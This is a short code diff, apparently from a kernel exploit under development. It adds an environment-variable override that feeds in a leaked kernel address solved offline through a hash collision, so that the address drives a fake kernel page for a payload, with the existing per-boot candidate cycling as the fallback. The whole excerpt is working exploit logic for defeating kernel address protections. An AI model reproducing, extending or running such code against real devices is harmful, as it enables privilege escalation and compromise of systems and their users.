@@ -746,7 +746,13 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
   /* CDY 4.14: 2-equality matching leaves ~2 candidates; cycle them across
      retries so the correct one eventually drives the fake page. */
   uintptr_t leaked = (uintptr_t)-1;
-  if (ks->mm_cand_cnt > 0) {
+  /* PC-solved override (offline jhash2 solve of the logged collision
+     set): bypasses on-device scoring noise entirely. */
+  const char *ovr = getenv("MM_OVERRIDE");
+  if (ovr && ovr[0]) {
+    leaked = (uintptr_t)strtoull(ovr, NULL, 16);
+    pr_info("[probe] MM_OVERRIDE leaked=%016zx\n", leaked);
+  } else if (ks->mm_cand_cnt > 0) {
       /* the round persists across reboots (main.c): candidate N per boot */
       leaked = ks->mm_cands[cand_round % ks->mm_cand_cnt];
       pr_info("[probe] candidate %zu/%zu = 0x%zx\n",
